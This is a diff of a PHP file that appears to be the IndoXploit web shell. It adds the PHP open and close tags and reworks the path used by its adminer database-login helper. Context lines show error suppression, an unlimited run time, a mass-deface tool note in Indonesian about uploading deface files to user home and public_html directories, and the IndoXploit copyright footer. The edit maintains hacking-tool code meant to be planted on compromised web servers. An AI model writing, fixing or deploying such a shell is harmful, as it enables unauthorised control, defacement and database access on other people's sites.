@@ -1,3 +1,4 @@
+<?php
 session_start();
 error_reporting(0);
 set_time_limit(0);
@@ -1301,8 +1302,7 @@ if($_GET['logout'] == true) {
 		NB: Sebelum gunain Tools ini , upload dulu file deface kalian di dir /home/user/ dan /home/user/public_html.</center>";
 	}
 } elseif($_GET['do'] == 'adminer') {
-	$full = "http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
-	$full = str_replace(basename($_SERVER['REQUEST_URI']), "", $full);
+	$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
 	if(file_exists('adminer.php')) {
 		echo "<center><font color=lime><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
 	} else {
@@ -1928,3 +1928,5 @@ if($_GET['logout'] == true) {
 	echo "<center>Copyright &copy; ".date("Y")." - <a href='http://indoxploit.or.id/' target='_blank'><font color=lime>IndoXploit</font></a></center>";
 }
 echo "</html>";
+
+?>
